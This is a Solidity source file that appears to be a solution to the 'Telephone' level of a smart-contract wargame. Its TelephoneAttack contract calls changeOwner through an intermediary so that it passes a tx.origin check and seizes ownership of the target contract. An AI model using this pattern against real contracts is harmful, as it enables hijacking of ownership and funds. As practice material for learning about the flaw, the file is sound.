// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "../../../src/levels/04-Telephone/Telephone.sol";

contract TelephoneAttack {
    Telephone public target;

    constructor(Telephone _target) {
        target = _target;
    }

    function telephoneAttack(address _newOwner) public {
        target.changeOwner(_newOwner);
    }
}
